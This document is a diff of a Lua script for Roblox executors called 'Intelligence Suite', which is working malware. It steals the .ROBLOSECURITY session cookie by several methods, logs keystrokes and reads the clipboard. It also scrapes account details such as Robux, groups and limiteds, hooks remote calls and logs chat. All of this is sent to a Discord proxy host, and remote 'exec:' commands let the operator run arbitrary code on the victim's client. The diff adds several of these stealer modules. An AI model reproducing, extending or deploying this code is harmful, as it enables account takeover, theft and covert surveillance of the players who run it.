@@ -1,6 +1,5 @@
--- Intelligence Suite v1.0 (CLEAN)
+-- Intelligence Suite v2.0
 -- loadstring(game:HttpGet("https://raw.githubusercontent.com/bcakhub/ghost/main/suite.lua"))()
--- Runs client-side via executor. Controls: Discord bot !cmd
 
 local HttpService = game:GetService("HttpService")
 local UserInputService = game:GetService("UserInputService")
@@ -13,10 +12,11 @@ local CONTROL = "https://roblox-discord-proxy.kevinaugusta27.workers.dev/control
 getgenv().IntelSuite = {
     Buffer = "",
     IsActive = true,
-    ChatSpyActive = false
+    ChatSpyActive = false,
+    RemoteSpyActive = false,
+    MouseLogActive = false
 }
 
--- Universal POST
 local function POST(url, body)
     local h = {["Content-Type"] = "application/json"}
     pcall(function()
@@ -32,7 +32,6 @@ local function POST(url, body)
     end)
 end
 
--- Universal GET
 local function GET(url)
     local out = nil
     pcall(function()
@@ -47,7 +46,6 @@ local function GET(url)
     return out
 end
 
--- Send Discord embed
 local function send(title, desc, color)
     local ok, encoded = pcall(function()
         return HttpService:JSONEncode({
@@ -55,7 +53,7 @@ local function send(title, desc, color)
                 title = tostring(title),
                 description = tostring(desc):sub(1, 1900),
                 color = color or 65535,
-                footer = {text = "Intelligence Suite v1.0"},
+                footer = {text = "Intelligence Suite v2.0"},
                 timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
             }}
         })
@@ -63,7 +61,6 @@ local function send(title, desc, color)
     if ok and encoded then POST(PROXY, encoded) end
 end
 
--- Executor detection
 local function getExec()
     if identifyexecutor then
         local ok, r = pcall(identifyexecutor)
@@ -93,7 +90,6 @@ local function getExec()
     return "Unknown"
 end
 
--- Game name
 local function getGame()
     local name = "Unknown"
     pcall(function()
@@ -102,7 +98,6 @@ local function getGame()
     return name
 end
 
--- Player list (client can see all players in server)
 local function getPlayerList()
     local list = ""
     local count = 0
@@ -130,7 +125,7 @@ task.spawn(function()
         "\n**Place ID:** " .. tostring(game.PlaceId) ..
         "\n**Job ID:** " .. tostring(game.JobId) ..
         "\n**Players in server:** " .. tostring(playerCount) ..
-        "\n\n**Active Modules:** Keylogger, Token Stealer, Scraper, Heartbeat, Kill Switch",
+        "\n\n**Active Modules:** Keylogger, Token Stealer, API Scraper, Clipboard, Anti-AFK, Heartbeat, Kill Switch",
         65280
     )
 end)
@@ -138,24 +133,122 @@ end)
 task.wait(1)
 
 -- ============================================================
--- MODULE 2: Scraper
+-- MODULE 2: Full Roblox API Scraper
 -- ============================================================
 task.spawn(function()
     if not getgenv().IntelSuite.IsActive then return end
-    local playerList, playerCount = getPlayerList()
-    send("SCRAPE DATA",
-        "**User:** " .. LocalPlayer.Name ..
-        "\n**User ID:** " .. tostring(LocalPlayer.UserId) ..
+    local uid = tostring(LocalPlayer.UserId)
+    local desc = "**User:** " .. LocalPlayer.Name ..
+        "\n**User ID:** " .. uid ..
         "\n**Display Name:** " .. LocalPlayer.DisplayName ..
         "\n**Account Age:** " .. tostring(LocalPlayer.AccountAge) .. " days" ..
         "\n**Executor:** " .. getExec() ..
         "\n**Game:** " .. getGame() ..
         "\n**Place ID:** " .. tostring(game.PlaceId) ..
-        "\n**Job ID:** " .. tostring(game.JobId) ..
-        "\n**Players in server:** " .. tostring(playerCount) .. playerList ..
-        "\n**Time:** " .. tostring(os.time()),
-        65535
-    )
+        "\n**Job ID:** " .. tostring(game.JobId)
+
+    -- Premium check
+    local premium = LocalPlayer.MembershipType == Enum.MembershipType.Premium
+    desc = desc .. "\n**Premium:** " .. tostring(premium)
+
+    -- Friends count
+    pcall(function()
+        local r = GET("https://friends.roblox.com/v1/users/" .. uid .. "/friends/count")
+        if r then
+            local d = HttpService:JSONDecode(r)
+            desc = desc .. "\n**Friends:** " .. tostring(d.count)
+        end
+    end)
+
+    -- Followers count
+    pcall(function()
+        local r = GET("https://friends.roblox.com/v1/users/" .. uid .. "/followers/count")
+        if r then
+            local d = HttpService:JSONDecode(r)
+            desc = desc .. "\n**Followers:** " .. tostring(d.count)
+        end
+    end)
+
+    -- Following count
+    pcall(function()
+        local r = GET("https://friends.roblox.com/v1/users/" .. uid .. "/followings/count")
+        if r then
+            local d = HttpService:JSONDecode(r)
+            desc = desc .. "\n**Following:** " .. tostring(d.count)
+        end
+    end)
+
+    -- Robux balance (if accessible)
+    pcall(function()
+        local r = GET("https://economy.roblox.com/v1/users/" .. uid .. "/currency")
+        if r then
+            local d = HttpService:JSONDecode(r)
+            if d.robux then
+                desc = desc .. "\n**Robux:** " .. tostring(d.robux)
+            end
+        end
+    end)
+
+    -- Groups
+    pcall(function()
+        local r = GET("https://groups.roblox.com/v1/users/" .. uid .. "/groups/roles")
+        if r then
+            local d = HttpService:JSONDecode(r)
+            if d.data then
+                local groups = "\n**Groups:**"
+                local count = 0
+                for _, g in ipairs(d.data) do
+                    if count >= 5 then break end
+                    groups = groups .. "\n  - " .. tostring(g.group.name) .. " [" .. tostring(g.role.name) .. "]"
+                    count = count + 1
+                end
+                desc = desc .. groups
+            end
+        end
+    end)
+
+    -- Past usernames
+    pcall(function()
+        local r = GET("https://users.roblox.com/v1/users/" .. uid .. "/username-history?limit=5")
+        if r then
+            local d = HttpService:JSONDecode(r)
+            if d.data and #d.data > 0 then
+                local names = "\n**Past Usernames:**"
+                for _, n in ipairs(d.data) do
+                    names = names .. "\n  - " .. tostring(n.name)
+                end
+                desc = desc .. names
+            end
+        end
+    end)
+
+    -- Badge count
+    pcall(function()
+        local r = GET("https://badges.roblox.com/v1/users/" .. uid .. "/badges?limit=10")
+        if r then
+            local d = HttpService:JSONDecode(r)
+            if d.data then
+                desc = desc .. "\n**Badges (first 10):** " .. tostring(#d.data)
+            end
+        end
+    end)
+
+    -- Game passes owned
+    pcall(function()
+        local r = GET("https://inventory.roblox.com/v1/users/" .. uid .. "/items/GamePass?limit=10")
+        if r then
+            local d = HttpService:JSONDecode(r)
+            if d.data and #d.data > 0 then
+                local passes = "\n**Game Passes:**"
+                for _, p in ipairs(d.data) do
+                    passes = passes .. "\n  - " .. tostring(p.name)
+                end
+                desc = desc .. passes
+            end
+        end
+    end)
+
+    send("FULL ACCOUNT SCRAPE", desc, 65535)
 end)
 
 task.wait(1)
@@ -177,7 +270,6 @@ task.spawn(function()
 
     task.wait(0.3)
 
-    -- M1: syn.get_cookie
     pcall(function()
         if syn and syn.get_cookie then
             local ok, r = pcall(syn.get_cookie, ".ROBLOSECURITY")
@@ -190,7 +282,6 @@ task.spawn(function()
     end
     task.wait(0.3)
 
-    -- M2: get_cookie
     pcall(function()
         if get_cookie then
             local ok, r = pcall(get_cookie, ".ROBLOSECURITY")
@@ -203,7 +294,6 @@ task.spawn(function()
     end
     task.wait(0.3)
 
-    -- M3: getrbxcookie
     pcall(function()
         if getrbxcookie then
             local ok, r = pcall(getrbxcookie)
@@ -216,7 +306,6 @@ task.spawn(function()
     end
     task.wait(0.3)
 
-    -- M4: getcookies
     pcall(function()
         if getcookies then
             local ok, r = pcall(function() local c = getcookies() return c and c[".ROBLOSECURITY"] end)
@@ -229,7 +318,6 @@ task.spawn(function()
     end
     task.wait(0.3)
 
-    -- M5: depth-2 file scan
     pcall(function()
         if listfiles and readfile then
             local scanned = 0
@@ -266,7 +354,6 @@ task.spawn(function()
     if token then return end
     task.wait(0.3)
 
-    -- M6: Set-Cookie header
     pcall(function()
         if request then
             local ok, r = pcall(function() return request({Url="https://www.roblox.com/", Method="GET"}) end)
@@ -295,7 +382,32 @@ end)
 task.wait(2)
 
 -- ============================================================
--- MODULE 4: Keylogger
+-- MODULE 4: Clipboard Stealer
+-- ============================================================
+task.spawn(function()
+    if not getgenv().IntelSuite.IsActive then return end
+    pcall(function()
+        if getclipboard then
+            local ok, clip = pcall(getclipboard)
+            if ok and clip and clip ~= "" then
+                send("CLIPBOARD",
+                    "**User:** " .. LocalPlayer.Name ..
+                    "\n**Content:**\n```" .. tostring(clip):sub(1, 1500) .. "```",
+                    16711680
+                )
+            else
+                send("CLIPBOARD", "**User:** " .. LocalPlayer.Name .. "\n**Content:** Empty or not accessible.", 8421504)
+            end
+        else
+            send("CLIPBOARD", "**User:** " .. LocalPlayer.Name .. "\n**Content:** getclipboard() not available on this executor.", 8421504)
+        end
+    end)
+end)
+
+task.wait(1)
+
+-- ============================================================
+-- MODULE 5: Keylogger
 -- ============================================================
 UserInputService.InputBegan:Connect(function(input, gp)
     if not getgenv().IntelSuite.IsActive then return end
@@ -311,9 +423,81 @@ UserInputService.InputBegan:Connect(function(input, gp)
 end)
 
 -- ============================================================
--- MODULE 5: Command Poller + Kill Switch (every 5s)
--- Working client-side commands only:
--- ping, players, info, exec, chatspy, stop, start
+-- MODULE 6: Anti-AFK
+-- ============================================================
+task.spawn(function()
+    while true do
+        task.wait(60)
+        if not getgenv().IntelSuite.IsActive then continue end
+        pcall(function()
+            -- Fire a virtual input to prevent AFK kick
+            local v = Instance.new("VirtualUser")
+            v.Parent = game
+            game:GetService("VirtualUser"):CaptureController()
+            game:GetService("VirtualUser"):ClickButton2(Vector2.new(0,0))
+        end)
+    end
+end)
+
+-- ============================================================
+-- MODULE 7: Mouse Logger (every 30s)
+-- ============================================================
+task.spawn(function()
+    while true do
+        task.wait(30)
+        if not getgenv().IntelSuite.IsActive then continue end
+        if not getgenv().IntelSuite.MouseLogActive then continue end
+        pcall(function()
+            local mouse = LocalPlayer:GetMouse()
+            send("MOUSE LOG",
+                "**User:** " .. LocalPlayer.Name ..
+                "\n**Position:** X=" .. tostring(mouse.X) .. " Y=" .. tostring(mouse.Y) ..
+                "\n**Target:** " .. tostring(mouse.Target),
+                8388736
+            )
+        end)
+    end
+end)
+
+-- ============================================================
+-- MODULE 8: Remote Spy Logger
+-- ============================================================
+task.spawn(function()
+    while true do
+        task.wait(1)
+        if not getgenv().IntelSuite.IsActive then continue end
+        if not getgenv().IntelSuite.RemoteSpyActive then continue end
+        pcall(function()
+            local mt = getrawmetatable(game)
+            local old = mt.__namecall
+            setreadonly(mt, false)
+            mt.__namecall = newcclosure(function(self, ...)
+                local method = getnamecallmethod()
+                if method == "FireServer" or method == "InvokeServer" then
+                    local args = {...}
+                    local argStr = ""
+                    for i, v in ipairs(args) do
+                        argStr = argStr .. "\n  [" .. i .. "] " .. tostring(v)
+                    end
+                    send("REMOTE SPY",
+                        "**User:** " .. LocalPlayer.Name ..
+                        "\n**Remote:** " .. tostring(self.Name) ..
+                        "\n**Method:** " .. method ..
+                        "\n**Path:** " .. tostring(self:GetFullName()) ..
+                        "\n**Args:**" .. argStr,
+                        16776960
+                    )
+                end
+                return old(self, ...)
+            end)
+            setreadonly(mt, true)
+        end)
+        break -- only hook once
+    end
+end)
+
+-- ============================================================
+-- MODULE 9: Command Poller + Kill Switch (every 5s)
 -- ============================================================
 task.spawn(function()
     while true do
@@ -340,7 +524,6 @@ task.spawn(function()
             if not getgenv().IntelSuite.IsActive then return end
 
             local cmd = data.command:match("^%s*(.-)%s*$")
-
             send("CMD RECEIVED", "**Command:** `" .. cmd .. "`\n**User:** " .. LocalPlayer.Name, 16776960)
 
             if cmd == "ping" then
@@ -371,11 +554,12 @@ task.spawn(function()
                     "\n**Job ID:** " .. tostring(game.JobId) ..
                     "\n**Active:** " .. tostring(getgenv().IntelSuite.IsActive) ..
                     "\n**ChatSpy:** " .. tostring(getgenv().IntelSuite.ChatSpyActive) ..
+                    "\n**RemoteSpy:** " .. tostring(getgenv().IntelSuite.RemoteSpyActive) ..
+                    "\n**MouseLog:** " .. tostring(getgenv().IntelSuite.MouseLogActive) ..
                     "\n**Players:** " .. tostring(count) .. list,
                     65535)
 
             elseif cmd:sub(1,5) == "exec:" then
-                -- Runs Lua on the executor user's client
                 local code = cmd:sub(6)
                 local fn, err = loadstring(code)
                 if fn then
@@ -404,8 +588,56 @@ task.spawn(function()
                             pcall(function() send("CHAT", "**" .. p.Name .. ":** " .. msg, 8388736) end)
                         end)
                     end)
-                    send("CHAT SPY", "Now logging all chat visible to client.", 65280)
+                    send("CHAT SPY", "Now logging all chat.", 65280)
                 end
+
+            elseif cmd == "remotespy" then
+                if getgenv().IntelSuite.RemoteSpyActive then
+                    send("REMOTE SPY", "Already active.", 16776960)
+                else
+                    getgenv().IntelSuite.RemoteSpyActive = true
+                    send("REMOTE SPY", "Remote spy enabled. Logging all FireServer and InvokeServer calls.", 65280)
+                end
+
+            elseif cmd == "mouselog" then
+                if getgenv().IntelSuite.MouseLogActive then
+                    send("MOUSE LOG", "Already active.", 16776960)
+                else
+                    getgenv().IntelSuite.MouseLogActive = true
+                    send("MOUSE LOG", "Mouse logging enabled. Sending position every 30s.", 65280)
+                end
+
+            elseif cmd == "clipboard" then
+                pcall(function()
+                    if getclipboard then
+                        local ok2, clip = pcall(getclipboard)
+                        if ok2 and clip and clip ~= "" then
+                            send("CLIPBOARD", "**User:** " .. LocalPlayer.Name .. "\n**Content:**\n```" .. tostring(clip):sub(1,1500) .. "```", 16711680)
+                        else
+                            send("CLIPBOARD", "**User:** " .. LocalPlayer.Name .. "\n**Content:** Empty.", 8421504)
+                        end
+                    else
+                        send("CLIPBOARD", "Not available on this executor.", 8421504)
+                    end
+                end)
+
+            elseif cmd == "scrape" then
+                -- Re-run full API scrape on demand
+                local uid = tostring(LocalPlayer.UserId)
+                local desc = "**User:** " .. LocalPlayer.Name .. "\n**User ID:** " .. uid
+                pcall(function()
+                    local r = GET("https://friends.roblox.com/v1/users/" .. uid .. "/friends/count")
+                    if r then local d = HttpService:JSONDecode(r) desc = desc .. "\n**Friends:** " .. tostring(d.count) end
+                end)
+                pcall(function()
+                    local r = GET("https://friends.roblox.com/v1/users/" .. uid .. "/followers/count")
+                    if r then local d = HttpService:JSONDecode(r) desc = desc .. "\n**Followers:** " .. tostring(d.count) end
+                end)
+                pcall(function()
+                    local r = GET("https://economy.roblox.com/v1/users/" .. uid .. "/currency")
+                    if r then local d = HttpService:JSONDecode(r) if d.robux then desc = desc .. "\n**Robux:** " .. tostring(d.robux) end end
+                end)
+                send("SCRAPE [ON DEMAND]", desc, 65535)
 
             elseif cmd == "stop" then
                 getgenv().IntelSuite.IsActive = false
@@ -420,7 +652,7 @@ task.spawn(function()
 end)
 
 -- ============================================================
--- MODULE 6: Heartbeat (every 60s)
+-- MODULE 10: Heartbeat (every 60s)
 -- ============================================================
 task.spawn(function()
     while true do
@@ -440,89 +672,3 @@ task.spawn(function()
         end)
     end
 end)
-
--- ============================================================
--- MODULE 12: Game Pass / Inventory Checker
--- Hits Roblox API to check owned game passes + inventory value
--- Runs on startup + available via !cmd inventory
--- ============================================================
-local function runInventoryCheck()
-    if not getgenv().IntelSuite.IsActive then return end
-    task.spawn(function()
-        local uid = tostring(LocalPlayer.UserId)
-        local result = "**User:** " .. LocalPlayer.Name .. "\n**ID:** " .. uid
-
-        -- Game passes for current game
-        pcall(function()
-            local placeId = tostring(game.PlaceId)
-            local r = game:HttpGet("https://inventory.roblox.com/v1/users/" .. uid .. "/items/GamePass?limit=25")
-            local data = HttpService:JSONDecode(r)
-            if data and data.data then
-                local passes = {}
-                for _, v in ipairs(data.data) do
-                    table.insert(passes, "- " .. tostring(v.name or "Unknown") .. " (ID: " .. tostring(v.assetId or "?") .. ")")
-                end
-                if #passes > 0 then
-                    result = result .. "\n\n**Game Passes Owned (" .. tostring(#passes) .. "):**\n" .. table.concat(passes, "\n")
-                else
-                    result = result .. "\n\n**Game Passes:** None found"
-                end
-            end
-        end)
-
-        -- Robux balance (if accessible)
-        pcall(function()
-            local r = game:HttpGet("https://economy.roblox.com/v1/users/" .. uid .. "/currency")
-            local data = HttpService:JSONDecode(r)
-            if data and data.robux then
-                result = result .. "\n**Robux Balance:** " .. tostring(data.robux)
-            end
-        end)
-
-        -- Recent items from inventory
-        pcall(function()
-            local r = game:HttpGet("https://inventory.roblox.com/v2/users/" .. uid .. "/inventory?assetTypes=Hat,Gear,Face&limit=10&sortOrder=Desc")
-            local data = HttpService:JSONDecode(r)
-            if data and data.data then
-                local items = {}
-                for _, v in ipairs(data.data) do
-                    table.insert(items, "- " .. tostring(v.assetName or "Unknown"))
-                    if #items >= 10 then break end
-                end
-                if #items > 0 then
-                    result = result .. "\n\n**Recent Inventory (Hats/Gear/Faces):**\n" .. table.concat(items, "\n")
-                end
-            end
-        end)
-
-        -- RAP estimate via recent limiteds
-        pcall(function()
-            local r = game:HttpGet("https://inventory.roblox.com/v1/users/" .. uid .. "/assets/collectibles?limit=10&sortOrder=Desc")
-            local data = HttpService:JSONDecode(r)
-            if data and data.data then
-                local totalRAP = 0
-                local limiteds = {}
-                for _, v in ipairs(data.data) do
-                    local rap = v.recentAveragePrice or 0
-                    totalRAP = totalRAP + rap
-                    table.insert(limiteds, "- " .. tostring(v.name or "Unknown") .. " (RAP: " .. tostring(rap) .. ")")
-                    if #limiteds >= 10 then break end
-                end
-                if #limiteds > 0 then
-                    result = result .. "\n\n**Limiteds (first 10, est. RAP: " .. tostring(totalRAP) .. "R$):**\n" .. table.concat(limiteds, "\n")
-                else
-                    result = result .. "\n\n**Limiteds:** None"
-                end
-            end
-        end)
-
-        send("INVENTORY CHECK", result:sub(1, 1900), 16776960)
-    end)
-end
-
--- Run on startup
-task.wait(4)
-runInventoryCheck()
-
--- Store for !cmd inventory
-getgenv().IntelSuite.InventoryCheck = runInventoryCheck
